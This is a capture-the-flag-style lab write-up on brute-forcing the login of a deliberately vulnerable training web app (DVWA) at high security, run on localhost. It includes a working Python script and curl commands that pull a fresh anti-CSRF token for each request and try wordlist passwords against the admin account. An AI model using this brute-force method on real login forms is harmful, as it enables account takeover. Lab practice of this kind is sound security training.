# DVWA Brute Force — High Security

## URL
http://127.0.0.1:4280/vulnerabilities/brute/

## Source Code Behavior (High)
- Adds anti-CSRF token (`user_token`) — must submit valid token with each request
- `sleep(rand(0, 3))` — random delay 0-3 seconds on failure
- Uses `stripslashes()` and `mysql_real_escape_string()`
- Still no account lockout
- Still GET-based

## Key Differences from Medium
1. CSRF token required — must fetch token before each login attempt
2. Random delay (0-3s) instead of fixed 2s
3. Each attempt requires 2 requests: GET page for token → GET login with token

## Bypass Techniques

### Two-step brute force (fetch token, then attempt login)
For each password attempt:
1. GET the login page to extract `user_token`
2. Submit login with the extracted token

### Python script with token extraction
```python
import requests
import re

url = "http://127.0.0.1:4280/vulnerabilities/brute/"
session = requests.Session()
session.cookies.set("PHPSESSID", "<session>")
session.cookies.set("security", "high")

with open("/usr/share/wordlists/rockyou.txt", "r", errors="ignore") as f:
    for password in f:
        password = password.strip()
        
        # Step 1: Get CSRF token
        r = session.get(url)
        token = re.search(r"user_token.*?value='(.*?)'", r.text).group(1)
        
        # Step 2: Attempt login with token
        params = {
            "username": "admin",
            "password": password,
            "Login": "Login",
            "user_token": token
        }
        r = session.get(url, params=params)
        
        if "Welcome" in r.text:
            print(f"[+] Found password: {password}")
            break
        else:
            print(f"[-] Failed: {password}")
```

### Hydra (requires custom module or won't work directly)
Standard Hydra HTTP GET form does not handle CSRF tokens natively.
Options:
1. Use the Python script above
2. Use Burp Suite Intruder with "Recursive Grep" to extract token
3. Use patator or custom tools that support token extraction

## Step-by-Step Exploitation
1. Inspect page source — find `user_token` hidden field
2. Confirm token changes on each page load
3. Write script that fetches token → submits login → repeats
4. Run script with wordlist
5. Password found: `password`

## curl Commands
```bash
# Step 1: Get the page and extract token
TOKEN=$(curl -s "http://127.0.0.1:4280/vulnerabilities/brute/" \
  -b "PHPSESSID=<session>;security=high" \
  | grep -oP "user_token.*?value='\K[^']+")

# Step 2: Attempt login with token
curl -v "http://127.0.0.1:4280/vulnerabilities/brute/?username=admin&password=password&Login=Login&user_token=$TOKEN" \
  -b "PHPSESSID=<session>;security=high"
```

## Notes
- CSRF token adds complexity but doesn't prevent brute force
- Each attempt is 2x slower (two HTTP requests per attempt)
- Random delay makes timing attacks inconsistent but doesn't prevent attack
- Still no account lockout — the fundamental weakness remains
- Custom scripting required — off-the-shelf tools may not handle the token
